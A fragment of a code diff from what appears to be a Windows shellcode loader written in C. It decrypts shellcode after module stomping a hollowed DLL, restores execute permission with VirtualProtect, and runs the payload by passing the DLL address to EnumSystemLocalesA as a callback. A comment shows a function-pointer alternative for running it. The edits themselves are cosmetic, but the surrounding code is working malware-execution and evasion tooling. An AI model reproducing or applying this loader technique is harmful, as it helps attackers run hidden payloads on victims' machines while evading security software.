-	PRINT_SUCCESST("Shellcode & key Decrypted after stomping, Shellcode length: %d", sizeof(shellcode));
+	PRINT_SUCCESST("Shellcode & key Decrypted after stomping, Shellcode length: %zd", sizeof(shellcode));
 	PRINT_STATUS("Restoring RX permission again");
 	
 	if (!VirtualProtect(pHollowedDLL, 4096, dwOldProtection, &dwOldProtection)) {
@@ -510,15 +519,17 @@ int main(int argc, char** argv) {
 		return -2;
 	}
 	
-	PRINT_SUCCESST("Hit enter to run shellcode/payload without creating a new thread");	getchar();
+	PRINT_SUCCESST("Hit enter to run shellcode/payload without creating a new thread");
+	getchar();
 	
 	BOOL success = EnumSystemLocalesA((LOCALE_ENUMPROCA)pHollowedDLL, LCID_SUPPORTED);
-	if (success) { return TRUE; } else { return FALSE; }
+	if (success) { return TRUE; }
+	else { return FALSE; }
 
 	/*
 		You can also use this technique for executing shellcode without create a new thread :
 		if (pHollowedDLL) { void (*funcPtr)(void) = (void (*)()) pHollowedDLL; funcPtr(); }
 	*/
 
-	return 0;
+	//return 0;
 }
